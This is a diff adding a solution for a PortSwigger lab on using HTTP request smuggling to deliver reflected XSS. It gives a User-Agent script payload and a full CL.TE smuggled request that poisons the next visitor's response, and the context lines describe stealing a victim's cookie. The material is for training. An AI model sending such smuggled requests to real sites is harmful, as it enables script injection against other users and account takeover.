@@ -13,6 +13,7 @@
 - [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-tecl-vulnerability)
 - [Exploiting HTTP request smuggling to reveal front-end request rewriting](#exploiting-http-request-smuggling-to-reveal-front-end-request-rewriting)
 - [Exploiting HTTP request smuggling to capture other users' requests](#exploiting-http-request-smuggling-to-capture-other-users-requests)
+- [Exploiting HTTP request smuggling to deliver reflected XSS](#exploiting-http-request-smuggling-to-deliver-reflected-xss)
 
 ## HTTP request smuggling, basic CL.TE vulnerability
 Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
@@ -387,3 +388,32 @@ csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net
 ```
 4. View the blog post to see if there's a comment containing a user's request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
 5. Copy the user's Cookie header from the comment, and use it to access their account.
+
+## Exploiting HTTP request smuggling to deliver reflected XSS
+Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss
+
+<!-- omit in toc -->
+### Solution
+1. Visit a blog post, and send the request to Burp Repeater.
+2. Observe that the comment form contains your ``User-Agent`` header in a hidden input.
+3. Inject an XSS payload into the ``User-Agent`` header and observe that it gets reflected:
+```
+"/><script>alert(1)</script>
+```
+4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor:
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+User-Agent: a"/><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
